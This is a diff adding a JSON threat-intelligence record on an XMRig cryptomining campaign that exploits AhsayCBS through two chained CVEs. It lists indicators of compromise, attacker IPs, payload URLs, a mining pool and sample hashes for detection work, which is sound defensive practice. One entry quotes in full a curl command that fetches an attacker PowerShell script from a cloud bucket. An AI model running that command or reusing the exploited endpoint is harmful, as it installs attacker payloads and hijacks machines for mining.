@@ -1,0 +1,354 @@
+{
+  "malware_family": "XMRig",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Threat actors chain CVE-2026-105133 (authentication bypass) and CVE-2026-105134 (unauthenticated RCE via /rps/api/json/UpdateReceivers.do) in AhsayCBS to spawn commands from cbssvcX64.exe, drop JSP webshells and deploy an XMRig Monero miner renamed edge.exe. Persistence is established through the masquerading MicrosoftEdgeUpdateSvc service running a renamed NSSM (msedge.exe) as SYSTEM, with Taskgmr.ps1 hiding the miner from Task Manager and WinRing0x64.sys giving the miner kernel-level hardware access. Payloads are fetched over HTTP from an Alibaba Cloud OSS bucket and mining traffic goes to an XMR pool on port 8029.",
+  "mitre_techniques": [
+    "T1608.001",
+    "T1190",
+    "T1059.001",
+    "T1059.003",
+    "T1569.002",
+    "T1505.003",
+    "T1543.003",
+    "T1036.004",
+    "T1036.005",
+    "T1564",
+    "T1057",
+    "T1124",
+    "T1105",
+    "T1071.001",
+    "T1571",
+    "T1496.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "process_name",
+      "value": "cbssvcX64.exe",
+      "context": "AhsayCBS service spawning suspicious child processes during exploitation",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "cbssvcX86.exe",
+      "context": "AhsayCBS service binary; Sigma rule flags unexpected children",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -sk -o \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Taskgmr.ps1\" \"http://imagefiles-backup.oss-ap-southeast-7.aliyuncs.com/javas/Office/win/Taskgmr.ps1\" --max-time 60",
+      "context": "Parent process cbssvcX64.exe downloads miner-enabling PowerShell script to Temp",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Taskgmr.ps1",
+      "context": "AI-assisted PowerShell script dropped in %TEMP% to hide cryptomining service",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Taskgmr.ps1",
+      "context": "Download path of Taskgmr.ps1 via curl from cbssvcX64.exe",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "msedge.exe",
+      "context": "Modified copy of legitimate NSSM utility, masquerades as Microsoft Edge",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "edge.exe",
+      "context": "XMRig miner renamed to masquerade as Microsoft Edge in Temp folder",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "config.json",
+      "context": "Miner configuration modified via PowerShell in Temp folder",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "WinRing0x64.sys",
+      "context": "Vulnerable kernel driver downloaded via certutil to give miner kernel-level access",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\REDACTED\\AppData\\Local\\Temp\\WinRing0x64.sys",
+      "context": "WinRing0 driver downloaded with certutil.exe into TEMP folder",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "MicrosoftEdgeUpdateSvc",
+      "context": "Actor-created service running msedge.exe (NSSM) as SYSTEM for persistence",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "edgeupdate",
+      "context": "Legitimate Microsoft Edge Update service name the actor service imitates",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "msedge_exe",
+      "context": "Original file name carried by Edge-named binaries per Sigma rule",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "--daemonized",
+      "context": "Flag on fake Edge binaries, detected alongside msedge_exe original file name",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "cbssvcX64.exe -> cmd.exe/curl/certutil.exe",
+      "context": "Web-app commands from uploaded JSP webshell appear as direct service children",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "com/ahsay/obs/api/ApiStructsAction.java",
+      "context": "File containing vulnerable checkSysPwd function (CVE-2026-105133)",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "JSP webshell",
+      "context": "Dropped into the application directory served by the AhsayCBS application",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "imagefiles-backup.oss-ap-southeast-7.aliyuncs.com",
+      "context": "Alibaba Cloud OSS bucket hosting all stage-two payloads",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://imagefiles-backup.oss-ap-southeast-7.aliyuncs.com/javas/Office/win/Taskgmr.ps1",
+      "context": "PowerShell script download URL used by curl from cbssvcX64.exe",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://imagefiles-backup.oss-ap-southeast-7.aliyuncs.com/javas/Office/win/edge.exe",
+      "context": "XMRig miner payload hosted on Alibaba Cloud OSS",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://imagefiles-backup.oss-ap-southeast-7.aliyuncs.com/javas/Office/win/msedge.exe",
+      "context": "Renamed NSSM utility payload hosted on Alibaba Cloud OSS",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://imagefiles-backup.oss-ap-southeast-7.aliyuncs.com/javas/Office/win/config.json",
+      "context": "Miner configuration payload hosted on Alibaba Cloud OSS",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://imagefiles-backup.oss-ap-southeast-7.aliyuncs.com/javas/Office/win/WinRing0x64.sys",
+      "context": "Vulnerable kernel driver payload hosted on Alibaba Cloud OSS",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "xmr.kryptex.network",
+      "context": "XMR mining pool contacted by the miner on port 8029",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "xmr.kryptex.network:8029",
+      "context": "Mining pool URL with non-standard port used by XMRig",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "51.195.127.124",
+      "context": "XMR pool IP contacted on port 8029",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "krxYMRN97D/creativejs",
+      "context": "Mining pool username/unique identifier for the XMR wallet",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/rps/api/json/UpdateReceivers.do",
+      "context": "Replication Receiver endpoint exploited for unauthenticated RCE (CVE-2026-105134)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "177.4.12.11",
+      "context": "Attacker infrastructure, AS140227 HKCICL-AS-AP Hong Kong",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "38.60.252.110",
+      "context": "Attacker infrastructure, AS154177 LIGHT4-AS-AP Vietnam",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "107.191.47.199",
+      "context": "Attacker infrastructure, AS20473 AS-VULTR France",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.220.236.49",
+      "context": "Attacker infrastructure, AS38136 AKARI-NETWORKS-AS-AP Taiwan",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "104.234.26.10",
+      "context": "Attacker infrastructure, AS134677 IDC-AS-AP United States",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "123.202.208.37",
+      "context": "Attacker infrastructure, AS9269 HKBN-AS-AP Hong Kong",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "05f69ae6b2b89c1c4dcf836bff032232f11bf0109f2b498e2345045d06139034",
+      "description": "msedge.exe - modified NSSM utility masquerading as Microsoft Edge for service persistence"
+    },
+    {
+      "sha256": "4dcb0202fe8b2d4d7b183764e38184cd6ed50132786cc7e7d1f7f4bce1dd6f3d",
+      "description": "edge.exe - XMRig cryptominer renamed to masquerade as Microsoft Edge"
+    },
+    {
+      "sha256": "481728a7c9c4c02be07051d9c1958d902ea6397ebb8952ab83944818e3d25d21",
+      "description": "Taskgmr.ps1 - AI-assisted PowerShell script hiding mining service from Task Manager"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
